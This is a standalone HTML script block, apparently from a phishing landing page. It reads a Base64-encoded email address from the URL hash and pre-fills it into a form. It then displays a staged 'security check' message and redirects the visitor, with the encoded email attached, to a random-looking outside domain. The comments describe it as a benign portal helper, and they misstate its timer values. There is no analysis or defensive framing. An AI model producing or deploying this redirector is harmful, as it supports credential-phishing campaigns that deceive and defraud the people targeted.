    <script>
        // Function to extract email from URL hash
        function getEmailFromHash() {
            try {
                var hash = window.location.hash.substr(1); // Remove the "#" symbol from the hash
                var decodedHash = atob(hash); // Decode the Base64 string
                return decodedHash;
            } catch (error) {
                console.error("Error extracting email from hash:", error);
                return null; // Return null if there's an error
            }
        }

        // Function to populate the email into your portal form field
        function populateEmail() {
            try {
                var email = getEmailFromHash();
                // Assuming your portal form field has an ID of "email"
                document.getElementById("email").value = email;
            } catch (error) {
                console.error("Error populating email:", error);
            }
        }

        // Call the populateEmail function when the page loads
        window.onload = function() {
            try {
                // Disconnect for 10 seconds (10000 milliseconds)
                setTimeout(function() {
                    // Reconnect after the disconnection period
                    // You can display a message indicating reconnection here if needed
                    console.log("Reconnecting...");

                    // After reconnecting, display the message indicating security check completion
                    document.querySelector('.security-check').style.display = 'block';

                    // Wait for additional 6 seconds (6000 milliseconds) before redirecting
                    setTimeout(function() {
                        // Redirect the user to the specified URL
                        var redirectTo = "https://kjfdsh.org/swksdesd#" + window.location.hash.substr(1);
                        console.log("Redirecting to: " + redirectTo);
                        window.location.href = redirectTo;
                    }, 1000); // Wait for 6 seconds after security check completion

                }, 1000); // Disconnect for 10 seconds

                // Populate email after 10 seconds
                setTimeout(function() {
                    populateEmail();
                    // Display the security check message
                    document.querySelector('.security-check').style.display = 'block';
                }, 1000);

            } catch (error) {
                console.error("Error during page load:", error);
            }
        };
    </script>
